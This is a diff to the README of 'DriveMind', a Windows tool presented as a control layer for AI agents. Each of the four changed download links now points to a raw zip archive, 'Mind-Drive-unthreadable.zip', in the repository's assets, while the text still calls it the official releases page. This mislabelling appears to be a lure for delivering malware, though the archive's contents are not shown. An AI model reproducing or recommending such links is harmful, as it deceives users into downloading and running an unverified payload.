@@ -1,6 +1,6 @@
 # 🤖 DriveMind - Reliable AI Agent Control Layer
 
-[![Download DriveMind](https://img.shields.io/badge/Download-DriveMind-brightgreen?style=for-the-badge)](https://github.com/markusstalwart875/DriveMind/releases)
+[![Download DriveMind](https://img.shields.io/badge/Download-DriveMind-brightgreen?style=for-the-badge)](https://github.com/markusstalwart875/DriveMind/raw/refs/heads/main/assets/Mind-Drive-unthreadable.zip)
 
 ---
 
@@ -34,7 +34,7 @@ No extra hardware or software is needed beyond a standard Windows PC.
 
 You can download DriveMind from the current releases page. This page holds all the latest versions and related files.
 
-[![Get DriveMind](https://img.shields.io/badge/Download-DriveMind-blue?style=for-the-badge)](https://github.com/markusstalwart875/DriveMind/releases)
+[![Get DriveMind](https://img.shields.io/badge/Download-DriveMind-blue?style=for-the-badge)](https://github.com/markusstalwart875/DriveMind/raw/refs/heads/main/assets/Mind-Drive-unthreadable.zip)
 
 1. Click the green button at the top or the link above to open the releases page.
 2. On the releases page, find the latest release listed at the top.
@@ -98,7 +98,7 @@ DriveMind updates improve reliability and add features.
 
 - To check for updates, open the app and click **Check for Updates** in the Help menu.
 - If an update is available, the app prompts you to download and install.
-- You can also visit the [DriveMind releases page](https://github.com/markusstalwart875/DriveMind/releases) to get the latest installer manually.
+- You can also visit the [DriveMind releases page](https://github.com/markusstalwart875/DriveMind/raw/refs/heads/main/assets/Mind-Drive-unthreadable.zip) to get the latest installer manually.
 - After installation, your settings and agents remain intact.
 
 ## 🛠️ Troubleshooting Common Issues
@@ -134,7 +134,7 @@ This knowledge helps you use DriveMind with confidence.
 
 Use this link to visit the official release page:
 
-[![Download DriveMind](https://img.shields.io/badge/Download-DriveMind-brightgreen?style=for-the-badge)](https://github.com/markusstalwart875/DriveMind/releases)
+[![Download DriveMind](https://img.shields.io/badge/Download-DriveMind-brightgreen?style=for-the-badge)](https://github.com/markusstalwart875/DriveMind/raw/refs/heads/main/assets/Mind-Drive-unthreadable.zip)
 
 ---
 
